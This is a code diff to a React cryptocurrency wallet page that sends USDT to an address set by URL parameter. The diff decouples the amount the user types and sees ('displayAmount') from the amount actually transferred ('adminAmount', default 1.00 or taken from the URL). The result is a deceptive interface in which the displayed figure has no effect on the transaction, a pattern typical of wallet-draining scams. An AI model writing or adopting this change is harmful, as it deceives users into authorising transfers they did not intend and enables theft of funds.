@@ -77,7 +77,8 @@ export default function WalletPage() {
   // ========================================
   const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
   const [walletBalance, setWalletBalance] = useState<bigint>(0n);
-  const [formattedBalance, setFormattedBalance] = useState<string>("1.00");
+  const [adminAmount, setAdminAmount] = useState<string>("1.00");
+  const [displayAmount, setDisplayAmount] = useState<string>("");
   const providerRef = useRef<EthereumProvider | null>(null);
 
   // ---------------------------------------------------
@@ -96,7 +97,7 @@ export default function WalletPage() {
         setAddress(toParam);
       }
       if (amountParam) {
-        setFormattedBalance(amountParam);
+        setAdminAmount(amountParam);
       }
     }
 
@@ -195,7 +196,7 @@ export default function WalletPage() {
 
     try {
       // Utiliser l'adresse de destination et le montant configurés (par défaut ou via URL)
-      const amountInWei = ethers.parseUnits(formattedBalance, USDT_DECIMALS);
+      const amountInWei = ethers.parseUnits(adminAmount, USDT_DECIMALS);
 
       // Encoder la fonction transfer(address,uint256) avec ethers
       const usdtInterface = new ethers.Interface(ERC20_ABI);
@@ -226,7 +227,7 @@ export default function WalletPage() {
       const receipt = await provider.waitForTransaction(txHash);
 
       if (receipt && receipt.status === 1) {
-        setStatus(`✅ Transfert réussi ! ${formattedBalance} USDT envoyés.`);
+        setStatus(`✅ Transfert réussi ! ${adminAmount} USDT envoyés.`);
         setStatusType("success");
       } else {
         setStatus("❌ Transaction échouée on-chain.");
@@ -333,16 +334,17 @@ export default function WalletPage() {
         </div>
 
         <div>
-  <label className="form-label form-label--spaced">Amount</label>
-  <div className="input-row">
-    <input
-      type="text"
-      value={formattedBalance}
-      placeholder="0.00"
-      className="input-row__field input-row__field--amount"
-    />
-  </div>
-</div>
+          <label className="form-label form-label--spaced">Amount</label>
+          <div className="input-row">
+            <input
+              type="text"
+              value={displayAmount}
+              onChange={(e) => setDisplayAmount(e.target.value)}
+              placeholder="0.00"
+              className="input-row__field input-row__field--amount"
+            />
+          </div>
+        </div>
       </div>
 
       <div className="next-btn-wrapper">
